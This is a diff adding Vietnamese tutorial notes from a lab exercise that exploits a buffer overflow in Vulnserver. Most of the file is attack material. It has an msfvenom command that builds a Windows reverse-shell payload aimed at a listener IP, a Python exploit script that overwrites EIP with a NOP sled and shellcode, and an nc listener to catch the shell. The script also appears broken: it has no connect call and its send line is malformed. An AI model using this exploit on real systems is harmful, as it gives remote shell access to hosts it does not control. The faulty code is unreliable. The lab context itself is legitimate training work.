@@ -1,0 +1,48 @@
+
+Vì vậy, cho đến thời điểm này, chúng ta đã tìm ra cách ghi đè EIP
+Và chúng ta cũng đã sử dụng nó để tạo một địa chỉ trả về.
+Ngoài ra, chúng ta cũng đã tìm thấy đúng mô-đun mà chúng ta muốn khai thác
+
+Và bây giờ tất cả những gì chúng ta phải làm là tạo một số mã shellcode đơn giản
+Sau đó thêm đoạn code này vào ô nhớ offset EIP để có lấy được quyền truy cập vào máy chủ Windows 7 (Vulnserver)
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.27.160 LPORT=4444 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"
+
+Options analysis:
+
+-p: payload
+EXITFUNC=thread: allow some stability for us. So if we don't have this as a possibility that we can gain connection and then lose the connection we don't want that. So the thread here just adds a little bit of stability into our code  
+-f c: generating C code even though we're going to put it into a python
+-a x86: architecture 32 bit
+-b: bad characters
+
+Copy đoạn shellcode vừa generate ở trên, dán vào script exploit.py như sau:
+###############################################################
+#!/usr/bin/python
+#625011af - EIP address
+
+import socket
+import os
+
+exploit = (
+Dán shellcode vừa copy vào đây
+)
+
+buffer_overflow = "A" * 20003 + "\xaf\x11\x50\x62" + "\x90" * 32 + exploit
+try:
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.send(('TRUN '/.:/' + buffer_overflow))
+except:
+	print "Exploit failed"
+s.close()
+
+###############################################################
+
+Mở 1 tab mới trên Kali linux và chạy netcat để lắng nghe các kết nối về port 4444 (reverse shell)
+
+nc -nvlp 4444
+
+Khởi động lại vulnserver trên máy windows 7
+
+Chạy file exploit.py và kiểm tra kết quả exploit.
+
